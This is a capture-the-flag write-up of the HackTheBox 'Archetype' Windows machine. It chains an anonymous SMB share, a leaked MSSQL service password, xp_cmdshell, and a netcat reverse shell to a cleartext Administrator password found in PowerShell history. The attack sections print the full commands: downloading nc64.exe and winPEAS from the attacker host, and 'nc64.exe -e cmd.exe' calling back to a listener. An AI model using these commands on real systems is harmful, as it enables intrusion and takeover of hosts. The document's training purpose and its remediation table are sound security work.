# Write-Up — Archetype: MSSQL Credential Leak to xp_cmdshell Reverse Shell

> **Type:** Network / Windows / Database Penetration Test (HTB Tier II)
> **Target:** `10.129.95.187` (`ARCHETYPE`)
> **Tools:** Nmap, smbclient, Impacket (mssqlclient.py), nc64.exe, PowerShell
> **Final Result:** Command execution via a misconfigured Microsoft SQL Server, reached using credentials leaked in an SMB-accessible configuration file

---

## 1. Introduction

The target is a Windows host running SMB file sharing and a **Microsoft SQL Server 2017** instance. The objective was to enumerate the exposed services, recover any leaked credentials, authenticate to the database, and escalate database access into full command execution on the underlying host.

This box is a step up from Tier 0/I in complexity and introduces concepts core to many real-world Windows/Active Directory-adjacent engagements:

- **Credential leakage via an accessible SMB share** — a configuration file left in a "backups" share containing a service account password in cleartext.
- **Windows Authentication to MSSQL** using a service account (`sql_svc`) that turned out to hold **sysadmin** privileges.
- **`xp_cmdshell` abuse** — a well-known MSSQL feature that, once enabled, allows direct operating-system command execution from within a SQL session.
- **Manual reverse shell staging** via PowerShell, `Invoke-WebRequest`, and a netcat binary transferred to the target.

---

## 2. Reconnaissance

### 2.1 Connectivity Check

```bash
ping 10.129.95.187
```

Successful replies confirmed the VPN tunnel was up and the target was reachable.

### 2.2 Port Scan — Nmap

```bash
nmap -sC -sV 10.129.95.187
```

Result (key findings):

| Port | Service | Notes |
|------|---------|-------|
| 139/445 | SMB | Windows file sharing |
| 1433/tcp | MSSQL | Microsoft SQL Server 2017 |

Two service categories stood out immediately: SMB, worth enumerating for accessible shares, and MSSQL, a database service that — if misconfigured — can be a direct path to command execution on the host.

---

## 3. SMB Enumeration

### 3.1 Listing Available Shares

```bash
smbclient -N -L \\\\10.129.95.187\\
```

`-N` specified no password (anonymous), and `-L` listed available shares. `ADMIN$` and `C$` returned **Access Denied**, as expected for administrative shares without valid credentials. A **`backups`** share, however, was accessible.

### 3.2 Exploring the Backups Share

```bash
smbclient -N \\\\10.129.95.187\\backups
```

A file named **`prod.dtsConfig`** — a configuration file — was found and retrieved:

```bash
get prod.dtsConfig
```

### 3.3 Identifying the Leaked Credential

Reviewing the downloaded file offline revealed a **cleartext password** for the `sql_svc` service account on host `ARCHETYPE`:

```
Password: M3g4c0rp123
```

---

## 4. Vulnerability Analysis

### 4.1 The Vulnerability

- **CVE:** N/A — this is a credential-management/exposure weakness, not a software bug
- **Type:** Cleartext credential stored in a configuration file accessible via an under-restricted SMB share
- **Authentication:** SMB share itself required no valid credentials to browse; the leaked password provided valid authentication to MSSQL
- **Impact:** Full **sysadmin**-level access to the SQL Server, and — via `xp_cmdshell` — command execution on the underlying Windows host

### 4.2 Connecting to MSSQL

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
cd examples/
python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
```

The `-windows-auth` flag specified Windows Authentication mode, and the leaked password authenticated successfully.

### 4.3 Confirming Privilege Level

```sql
SELECT is_srvrolemember('sysadmin');
```

Result: `1` (**True**) — the `sql_svc` account held full sysadmin privileges on the SQL Server, a significant over-privileging for a service account.

---

## 5. Foothold — Command Execution via xp_cmdshell

### 5.1 Checking xp_cmdshell Status

```sql
EXEC xp_cmdshell 'net user';
```

Result: not enabled (no output returned) — `xp_cmdshell` is disabled by default on modern MSSQL installations.

### 5.2 Enabling xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Because the account held sysadmin rights, both configuration changes succeeded without restriction.

### 5.3 Confirming Command Execution

```sql
EXEC xp_cmdshell "whoami";
```

This returned the current OS user context, confirming full command execution capability directly from the SQL session.

---

## 6. Escalating to an Interactive Reverse Shell

### 6.1 Staging a Netcat Listener and File Server

On the attacking host:

```bash
sudo python3 -m http.server 80
```

(from the directory containing `nc64.exe`), and in a separate terminal:

```bash
sudo nc -lvnp 443
```

### 6.2 Identifying a Writable Working Directory on the Target

As `archetype\sql_svc`, there were insufficient privileges to write to a system directory — only `Administrator` could operate there. Enumeration confirmed that the user's own `Downloads` folder was writable:

```
C:\Users\sql_svc\Downloads
```

### 6.3 Transferring the Netcat Binary

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe";
```

`wget` here is PowerShell's alias for `Invoke-WebRequest`, used to pull the binary from the attacker's HTTP server onto the target. The request was confirmed as received on the Python HTTP server's access log.

### 6.4 Triggering the Reverse Shell

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443";
```

The netcat listener on the attacking machine received an interactive `cmd.exe` session as `archetype\sql_svc`, confirming a stable foothold on the target beyond the constrained SQL execution context.

### 6.5 User Flag

The user flag was located directly on the user's Desktop:

```
C:\Users\sql_svc\Desktop\user.txt
```

> **Severity: Critical.** A service account with an unnecessarily elevated (sysadmin) role, combined with a leaked cleartext password, allowed full arbitrary command execution and an interactive shell on a Windows host — all without exploiting any software vulnerability.

---

## 7. Privilege Escalation

### 7.1 Transferring winPEAS

To automate enumeration of local privilege escalation paths, **winPEAS** was transferred to the target using the same Python HTTP server / PowerShell `wget` pattern used for the netcat binary:

On the attacking host:

```bash
python3 -m http.server 80
```

On the target, from an interactive PowerShell session (via the netcat shell already obtained):

```powershell
wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
```

### 7.2 Running winPEAS

```powershell
.\winPEASx64.exe
```

The output flagged that the current user held **`SeImpersonatePrivilege`** — a privilege commonly abusable via "Potato"-family exploits (e.g., JuicyPotato) to escalate from a service account to `SYSTEM`/Administrator. Before pursuing that route, a simpler avenue was checked first: locally stored credentials.

### 7.3 Recovering Credentials from PowerShell History

Service and user accounts frequently leave a trail of previously executed commands. On Windows, PowerShell retains this history in a file analogous to `.bash_history` on Linux:

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```powershell
cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
type ConsoleHost_history.txt
```

This revealed a **cleartext password for the Administrator account**:

```
MEGACORP_4dm1n!!
```

### 7.4 Escalating to Administrator via psexec.py

With valid Administrator credentials in hand, Impacket's `psexec.py` was used to obtain a SYSTEM-level/Administrator shell directly:

```bash
python3 psexec.py administrator@10.129.95.187
```

Authenticating with the recovered password (`MEGACORP_4dm1n!!`) granted an interactive shell running as `NT AUTHORITY\SYSTEM` / Administrator context.

### 7.5 Root Flag

```
C:\Users\Administrator\Desktop\root.txt
```

This returned the final flag, completing the machine.

> **Severity: Critical.** A password left in cleartext inside a routinely-overlooked PowerShell history file allowed a full, direct escalation from a low-privilege service account to Administrator — no exploit development was required, and the `SeImpersonatePrivilege` finding (a viable alternative path via Potato-style exploits) wasn't even needed.

---

## 8. Full Attack Chain

```
[ Recon: Nmap ]
       │
       ▼
[ SMB (139/445) + MSSQL (1433) identified ]
       │
       ▼
[ smbclient -L → backups share accessible anonymously ]
       │
       ▼
[ prod.dtsConfig retrieved → cleartext sql_svc password found ]
       │
       ▼
[ mssqlclient.py ARCHETYPE/sql_svc -windows-auth → authenticated ]
       │
       ▼
[ is_srvrolemember('sysadmin') → True ]
       │
       ▼
[ xp_cmdshell enabled via sp_configure ]
       │
       ▼
[ xp_cmdshell "whoami" → command execution confirmed ]
       │
       ▼
[ nc64.exe staged to Downloads via HTTP + PowerShell wget ]
       │
       ▼
[ Reverse shell triggered → interactive cmd.exe as sql_svc → user.txt read ]
       │
       ▼
[ winPEASx64.exe staged and run → SeImpersonatePrivilege flagged ]
       │
       ▼
[ ConsoleHost_history.txt read → cleartext Administrator password found ]
       │
       ▼
[ psexec.py administrator@[TARGET_IP] → Administrator/SYSTEM shell ]
       │
       ▼
[ root.txt read from Administrator's Desktop ]
```

**Lesson:** No exploit code was written or required at any stage — not even for the final privilege escalation. A single overlooked configuration file on an accessible SMB share, followed by a password left behind in a command history file, were enough to go from zero access to full Administrator control.

---

## 9. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | Cleartext credentials stored in a configuration file on an SMB share | **Critical** | Never store credentials in cleartext in configuration files. Use a secrets manager or environment-based configuration with encrypted secrets. Restrict SMB share permissions to only the accounts/systems that require access. |
| 2 | `backups` SMB share accessible without authentication | **High** | Require authenticated, least-privilege access to all shares; audit shares regularly for anonymous/guest accessibility and unintended content. |
| 3 | `sql_svc` service account holds `sysadmin` privileges | **Critical** | Apply least-privilege principles to service accounts — grant only the specific database roles/permissions required for the account's function, never blanket sysadmin rights. |
| 4 | `xp_cmdshell` available for activation by a service account | **High** | Disable and, where policy allows, remove `xp_cmdshell` entirely on production SQL Servers where OS command execution is not a required business function; restrict `sp_configure` changes to true administrators. |
| 5 | No apparent egress filtering, allowing outbound HTTP fetch and reverse shell callback | **Medium** | Restrict outbound network access from database servers to only what is operationally required; block arbitrary outbound HTTP/TCP connections from server-tier hosts. |
| 6 | `sql_svc` holds `SeImpersonatePrivilege`, a token-impersonation right exploitable via Potato-family attacks | **High** | Remove unnecessary user-rights assignments (`SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`) from service accounts that do not require them; apply Windows Server hardening baselines (e.g., CIS benchmarks). |
| 7 | Administrator password stored in cleartext in PowerShell command history (`ConsoleHost_history.txt`) | **Critical** | Never type sensitive credentials directly into an interactive shell where they will be logged; use secure credential prompts (`Get-Credential`) or credential vaults instead. Periodically audit and clear `PSReadLine` history on sensitive hosts. |
| 8 | Password reuse: the same Administrator credential appears to have been used/tested elsewhere in the environment | **Medium** | Enforce unique, regularly rotated passwords for privileged accounts, and monitor for credential reuse across systems using tools like a password manager or PAM (Privileged Access Management) solution. |

---

## 10. Conclusion

This box is a compact illustration of principles that show up constantly in real Windows/AD-adjacent environments:

1. **Configuration files are a frequent, underrated source of credential leakage.** A single `.dtsConfig` file, left in a share that should have been locked down, was the entire initial access vector.
2. **Service accounts are routinely over-privileged.** A SQL Server service account with sysadmin rights turned "read a config file" into "full command execution on the host."
3. **`xp_cmdshell` is a powerful, well-documented pivot point.** Once sysadmin access to MSSQL is achieved, enabling it is a single configuration change away from arbitrary OS-level control.
4. **The simplest privilege escalation path is often just leftover credentials.** Despite a viable kernel/token-abuse route (`SeImpersonatePrivilege` + Potato exploits), the fastest and most reliable path to Administrator was a password sitting in plaintext in a command history file.

The fix, as with most findings of this class, is layered least-privilege discipline: lock down shares, avoid cleartext secrets anywhere — including shell history — scope service accounts tightly, and disable dangerous database features and user rights that aren't strictly needed.
